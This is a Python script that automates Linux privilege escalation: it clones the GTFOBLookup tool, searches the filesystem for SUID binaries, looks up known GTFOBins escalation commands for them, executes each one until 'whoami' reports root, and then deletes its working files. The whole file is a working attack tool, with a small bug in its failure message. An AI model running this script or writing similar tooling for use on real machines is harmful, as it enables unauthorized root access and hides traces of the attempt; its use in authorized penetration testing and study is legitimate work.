import os
from threading import Thread
from time import sleep
from git import Repo

def line():
	print("-"*90)

def cleanJunks():
	os.system("rm -rf GTFOBLookup")
	sleep(0.2)
	os.system("rm -r SUIDs.txt")
	sleep(0.2)
#	os.system("rm -r vulnerabilities.txt")
	sleep(0.2)
#	os.system("rm -r filteredVulnerabilities.txt")
	sleep(0.2)
	os.system("rm -r whoami.txt")
	sleep(0.2)
#	os.system("rm -r UsefulSUIDs.txt")
	sleep(0.2)
	


def cloneGTFOBins():
	print("Cloning in process...")
#	Repo.clone_from("git clone https://github.com/nccgroup/GTFOBLookup.git")
	os.system("git clone https://github.com/nccgroup/GTFOBLookup.git")
	sleep(0.2)

	print("Installing requirements...")
	os.system("pip install -r GTFOBLookup/requirements.txt")
	sleep(0.2)

	print("Installing new updates...")
	os.system("python3 GTFOBLookup/gtfoblookup.py update")

def findSUIDPermissions():
	os.system("find / -perm -04000 2>/dev/null > SUIDs.txt")

def findVulnerableSUIDs():
	os.system("python3 GTFOBLookup/gtfoblookup.py gtfobins search -f UsefulSUIDs.txt > vulnerabilities.txt")

def callVulnerableCommand(command):
	os.system(command)
	print("Testing if we got the root or not...")
	os.system("whoami > whoami.txt")
	whoamiFile=open("whoami.txt",'r')
	if whoamiFile.readline().find("root")!=-1:
		print("Privlege escallation successful")
		print("Calling command: exit")
		os.system("exit")
	else: 
		print("Privlege escallation failed for: ", x[0:5])


# =================================================================================================================================
# Cloning GTFOBins...
# =================================================================================================================================

thread0=Thread(target=cloneGTFOBins)

line()
print("Cloning GTFOBins...")
thread0.start()

while thread0.is_alive():
	sleep(0.1)
print("Cloning successful !!!")


# =================================================================================================================================
# Code to find useful SUIDs
# =================================================================================================================================

thread1=Thread(target=findSUIDPermissions)

line()
print("Finding SUIDs...")
thread1.start()

while thread1.is_alive():
	sleep(0.1)
print("SUIDs found !!!")

line()
print("Filterning SUIDs (Phase 1)...")

suidPermissionsFile = open("SUIDs.txt",'r')
usefulSUIDFile = open("UsefulSUIDs.txt",'w')

# usefulSUIDs=list()
for x in suidPermissionsFile:
	if(x.startswith("/usr/bin/")):
		x=x[9:]
#		usefulSUIDs.append(x)
		usefulSUIDFile.write(x)

print("SUIDs filtered. Phase 1 completed !!! ")
suidPermissionsFile.close()
usefulSUIDFile.close()
# print(usefulSUIDs,end='')
# print("\n")


# =================================================================================================================================
# Code to filter the vulnerable SUIDs
# =================================================================================================================================

line()
print("Filterning SUIDs (Phase 2)...")

thread2= Thread(target=findVulnerableSUIDs)
thread2.start()
while thread2.is_alive():
	sleep(0.1)

print("SUIDs filtered. Phase 2 completed !!! ")


# =================================================================================================================================
# Code to extract commands from GTFOBins
# =================================================================================================================================


line()
print("Extracting commands from GTFOBins...")

vulnerabilities = open("vulnerabilities.txt",'r')
filteredVulnerabilities=list()
filteredVulnerabilitiesFile=open("filteredVulnerabilities.txt", 'w')

x="!!"
while x!= "":
	x=vulnerabilities.readline()
	if x.find("not found")==-1:
		if x.find("Code")!=-1:
			x=x.lstrip()
			x=x[6:]
			while x!='\n':
				x=x.lstrip()
				filteredVulnerabilities.append(x)
				filteredVulnerabilitiesFile.write(x)
				print(x)
				x=vulnerabilities.readline()
			filteredVulnerabilitiesFile.write('\n')

print("Commands extraction successful.")
print("Total commands found: ", len(filteredVulnerabilities))
vulnerabilities.close()
filteredVulnerabilitiesFile.close()


# =================================================================================================================================
# Code to execute vulnerable commands
# =================================================================================================================================

line()
print("Executing commands...")

if len(filteredVulnerabilities)!=0:
	filteredVulnerabilitiesFile=open("filteredVulnerabilities.txt",'r')
	x=""
	escallationStatus=0
	x=filteredVulnerabilitiesFile.readline()	
	while x!="":
		while x!="\n" and x!="":
			print("Trying to hack using command: ",x)
			thread = Thread(target=callVulnerableCommand, args=(x, ))
			thread.start()
			sleep(3)
			if thread.is_alive():
				escallationStatus=1 
				break
			x=filteredVulnerabilitiesFile.readline()
		if escallationStatus==1: break
		x=filteredVulnerabilitiesFile.readline()
	filteredVulnerabilitiesFile.close()
#	os.system("exit")
else:
	print("Command execution failed! No commands found...")
	print("Unable to exploit using GTFOBins")

# =================================================================================================================================
# Code to cleanup everything
# =================================================================================================================================

line()
print("Cleaning junks...")

thread00=Thread(target=cleanJunks)
thread00.start()

while thread00.is_alive():
	sleep(0.2)
print("Cleaning completed !!!")
